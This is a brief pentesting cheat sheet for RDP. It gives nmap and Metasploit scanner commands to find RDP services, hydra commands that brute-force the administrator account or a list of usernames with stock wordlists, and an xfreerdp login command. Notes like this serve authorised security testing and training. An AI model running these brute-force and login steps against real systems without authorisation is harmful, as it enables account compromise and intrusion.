# RDP

```
nmap -Pn -sV -p3389 <ip>
```

```
use auxiliary/scanner/rdp/rdp_scanner
set RPORT <port>
```

```
hydra -l administrator -P /usr/share/wordlists/metasploit/unix_passwords.txt <ip> -s <port> rdp
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt <ip> -s <port> rdp
```

```
xfreerdp /u:administrator /p:<password> /v:<ip>:<port>
```
